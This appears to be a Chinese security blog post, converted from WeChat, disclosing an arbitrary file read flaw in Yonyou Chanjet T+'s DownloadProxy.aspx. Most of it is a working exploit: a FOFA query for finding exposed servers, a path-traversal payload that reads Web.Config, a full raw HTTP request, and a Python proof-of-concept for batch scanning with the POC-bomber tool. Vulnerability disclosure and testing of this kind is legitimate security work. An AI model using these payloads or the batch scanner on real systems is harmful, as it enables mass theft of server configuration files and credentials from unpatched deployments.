<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/bnlmVUYbzg_8EI1OMLsc1Q)

#### 漏洞描述

用友 畅捷通 T+ DownloadProxy.aspx 文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器上的敏感文件

#### 漏洞影响

```
用友 畅捷通T+

```

#### fofa：

```
app="畅捷通-TPlus"

```

#### 漏洞复现

登录页面：

```
http://xxx.xxx.xx.xxx:8080/tplus/view/login.html

```

![](https://mmbiz.qpic.cn/mmbiz_png/sajqow3Sgia7kWJlefpiaW49YyAtyfj1YM5ZJw5lQHYRaic1CFkpDCcxRX3cVakaKq3x391D1lKvnzGy6xygzGNbQ/640?wx_fmt=png)

验证 POC

```
/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config

```

```
GET /tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../web.config HTTP/1.1
Host: xxx.xxx.xx.xxx:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: ASP.NET_SessionId=xf1qosdhzc432rynj3scyr4b; _sid=admin
If-None-Match: W/"5987cf44-7aab"
If-Modified-Since: Mon, 07 Aug 2017 02:24:04 GMT
Connection: close

```

![](https://mmbiz.qpic.cn/mmbiz_png/sajqow3Sgia7kWJlefpiaW49YyAtyfj1YMvceWYduRC1nX6zexVc2Najs9pYjGu19IpyLNMKs0gTBp8fnc7rjtLg/640?wx_fmt=png)

使用 tr0uble_mAker 大佬的 POC bomber 工具，并为其编写 poc，可以做批量化漏洞检测。（ps: 该工具非常好用）

项目地址：  

```
https://github.com/tr0uble-mAker/POC-bomber

```

poc：  

```
#!/usr/local/bin/python3
# -*- coding: utf-8 -*-
# @Time    : 2022/12/10 15:09
# @Author  : zhang3
import requests
import urllib
import re
def verify(url):
    headers = {"Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
               "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"
               }
    result={
        'name':'用友 畅捷通T+ DownloadProxy.aspx 任意文件读取漏洞',
        'vulnerable': False
    }
    try:
        payload='/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config'
        url=url.strip()
        v_url=urllib.parse.urljoin(url,payload)
        res=requests.get(url=v_url,headers=headers,timeout=9)
        #判断是否存在漏洞
        if res.status_code==200 and re.search('value',res.text):
            # res.status_code==200 and 'value' in res.text:
            result['vulnerable']=True
            result['url']=url
            result['method']='GET'
            result['payload']=v_url
            result['about']='https://github.com/xxx'
        return result
    except:
        return result
    finally:
        return result

```

检测效果：   （工具的具体使用请移步原作者项目地址）  

![](https://mmbiz.qpic.cn/mmbiz_png/sajqow3Sgia7kWJlefpiaW49YyAtyfj1YMvppndvqIRqcoM7rVjL8iaHC6zY6vbwAeqoH4qKhGUn59hp7X8xPViaEw/640?wx_fmt=png)